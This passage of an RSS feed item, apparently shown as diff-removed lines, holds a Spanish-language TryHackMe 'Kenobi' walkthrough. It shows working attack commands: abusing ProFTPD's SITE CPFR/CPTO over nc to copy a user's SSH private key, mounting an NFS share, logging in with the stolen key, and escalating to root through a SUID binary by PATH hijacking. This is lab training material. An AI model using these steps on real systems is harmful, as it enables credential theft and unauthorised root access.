-&lt;p&gt;La ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var&lt;/code&gt; está siendo compartida a nivel de red, de modo que si lográramos mover algún archivo potencial dentro de esta ruta, y luego la montásemos en nuestro equipo, podríamos visualizar dicho archivo de manera local.&lt;/p&gt;
-
-&lt;h3 id=&quot;fase-de-explotación&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Fase De Explotación&lt;/h3&gt;
-
-&lt;p&gt;Lo primero que podemos pensar es buscar alguna vulnerabilidad en el servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ProFTPD&lt;/code&gt;, basado en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt; (File Transfer Protocol), moviendo así archivos desde el lado del cliente, hacia el servidor.&lt;/p&gt;
-
-&lt;p&gt;Para explotar el servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ProFTPD&lt;/code&gt;, empezaremos buscando algún exploit que se encuentre en &lt;em&gt;Exploit Database&lt;/em&gt;, para ello utilizaremos &lt;em&gt;SearchSploit&lt;/em&gt; para poder seguir trabajando desde nuestra terminal.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;searchsploit ProFTPD 1.3.5
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/9.png&quot; alt=&quot;9&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;De los &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4&lt;/code&gt; exploits que encontramos, nos quedaremos con el último&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/10.png&quot; alt=&quot;10&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Concretamente con las líneas 12, 13 y 14.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/11.png&quot; alt=&quot;11&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Las cuales nos permiten hacer justamente lo que nos interesa, copiar un archivo de una ruta (&lt;em&gt;CPFR&lt;/em&gt;), a otra (&lt;em&gt;CPTO&lt;/em&gt;).&lt;/p&gt;
-
-&lt;p&gt;De este modo, si nos conectamos a la máquina víctima a través del puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;21&lt;/code&gt;, podremos ejecutar estos comandos.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &amp;lt;direción IP&amp;gt; 21
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SITE CPFR /home/kenobi/.ssh/id_rsa
-SITE CPTO /var/tmp/id_rsa
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/12.png&quot; alt=&quot;12&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ya con todo esto, podemos &lt;em&gt;montar&lt;/em&gt; la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var&lt;/code&gt; en nuestro equipo, para ello haremos lo siguiente:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;mount &amp;lt;dirección IP&amp;gt;:/var /mnt/kenobiNFS
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;En caso de que tengamos un error similar a este:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/13.png&quot; alt=&quot;13&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Simplemente tendremos que instalar lo siguiente:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;nfs-common
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Y ya que estamos, podemos también instalar la utilidad para montar archivo de tipo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CIFS&lt;/code&gt;, que puede resultarnos de utilidad en algún momento.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;cifs-utils
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Una vez tenemos montada la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var&lt;/code&gt; en nuestro equipo, procederemos a copiarnos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt; que movimos con anterioridad haciendo uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ProFTPD&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Finalmente, podemos conectarnos a la máquina víctima a través de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH&lt;/code&gt; sin proporcionar contraseña, ya que tenemos en nuestro poder la &lt;em&gt;clave privada&lt;/em&gt; del usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Kenobi&lt;/code&gt;, no obstante, antes de hacerlo, vamos a asignar los permisos correspondientes al archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo chmod &lt;/span&gt;600 id_rsa
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_rsa kenobi@&amp;lt;dirección IP&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/14.png&quot; alt=&quot;14&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;escalada-de-privilegios&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Escalada De Privilegios&lt;/h3&gt;
-
-&lt;p&gt;Para realizar esta última fase, la misma plataforma de &lt;em&gt;TryHackMe&lt;/em&gt; nos sugiere aprovecharnos de algún binario con permisos mal asignados, concretamente permisos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SUID&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Para listar todos aquellos binarios con permisos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SUID&lt;/code&gt; asignados, tenemos varias opciones, no obstante, estas son las que yo utilizo:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-4000&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-exec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; 2&amp;gt;/dev/null &lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / &lt;span class=&quot;nt&quot;&gt;-uid&lt;/span&gt; 0 &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-4000&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f 2&amp;gt;/dev/null
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/15.png&quot; alt=&quot;15&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;La forma más sencilla para abusar de algún binario con permisos mal asignados sería recurrir a &lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;GTFOBins&lt;/a&gt;, sin embargo, el binario que llama nuestra atención no es propio del sistema, por lo que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GTFOBins&lt;/code&gt;, no nos será de utilidad.&lt;/p&gt;
-
-&lt;p&gt;Si comprobamos en nuestra máquina de atacantes, no existe ningún binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/menu&lt;/code&gt;, por lo que este debe haber sido creado, de modo que puede tener alguna falla de seguridad, vamos a revisarlo.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/16.png&quot; alt=&quot;16&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Vemos que el binario es lo que dice ser, un menú que nos presenta tres únicas posibilidades, vamos a echar un vistazo más a fondo.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;strings /usr/bin/menu
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/17.png&quot; alt=&quot;17&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Podemos observar los binarios que utiliza este menú dependiendo de la opción que seleccionemos, lo más interesante aquí es que no se está empleando la ruta completa de estos comandos, tan solo se los está mencionando, por lo que, al no hacer esta verificación, podemos suplantarlos.&lt;/p&gt;
-
-&lt;p&gt;Antes de que el binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/menu&lt;/code&gt; encuentre los binarios legítimos dentro de la variable de entorno &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH&lt;/code&gt;, nosotros añadiremos nuestros propios binarios en el inicio, los cuales serán igual en nombre, pero ejecutarán el código que nos interese, en este caso una consola con máximos privilegios.&lt;/p&gt;
-
-&lt;p&gt;Este proceso podemos realizarlo para cualquiera de los tres binarios, &lt;em&gt;curl&lt;/em&gt;, &lt;em&gt;uname&lt;/em&gt; o &lt;em&gt;ifconfig&lt;/em&gt;, eso si, debemos de encontrarnos en una ruta donde tengamos permisos de escritura, el directorio del usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Kenobi&lt;/code&gt;, o la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; por ejemplo.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;/bin/sh&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;uname
-export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/home/kenobi:&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x &lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/18.png&quot; alt=&quot;18&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-</description>
-        <pubDate>Mon, 07 Feb 2022 00:00:00 -0500</pubDate>
-        <link>/es/Kenobi-TryHackMe/</link>
-        <guid isPermaLink="true">/es/Kenobi-TryHackMe/</guid>
       </item>
     
   </channel>
